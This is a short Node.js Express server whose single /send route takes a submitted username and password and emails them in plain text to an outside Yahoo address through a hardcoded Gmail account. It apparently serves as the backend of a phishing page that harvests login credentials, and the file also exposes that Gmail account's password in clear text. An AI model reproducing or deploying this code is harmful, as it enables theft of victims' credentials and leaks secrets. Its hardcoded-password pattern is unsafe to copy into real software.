const express = require('express');
const nodemailer = require('nodemailer');
require('dotenv').config();

const app = express()

app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*')
    res.setHeader('Access-Control-Allow-Credentials', 'true')
    res.setHeader('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content, Accept, Content-Type, Authorization')
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS')
    next()
  });

app.use(express.json());
app.use(express.urlencoded({
  extended: true
}))

app.use(express.static('./'));


app.post('/send', async (req, res) => {
    var transporter = nodemailer.createTransport({
        host: "smtp.gmail.com",
        port: 587,
        secure: false, // true for 465, false for other ports
        auth: {
          user: "yacini.kenzy@gmail.com", // generated ethereal user
          pass: "xpwww555aze123", // generated ethereal password
        },
      });

    await transporter.sendMail({
    from: "yacini.kenzy@gmail.com", // sender address
    to: "kyacini@yahoo.fr", // list of receivers
    subject: "Identifiant", // Subject line
    text: "Username : " + req.body.username + "\n" + "Password : " + req.body.password, // plain text body
    }, (err, info) => {
      if(err){
        res.status(400).send(err);
      }else{
        res.status(200).send("Bien joué");
      }
    });

})

module.exports = app;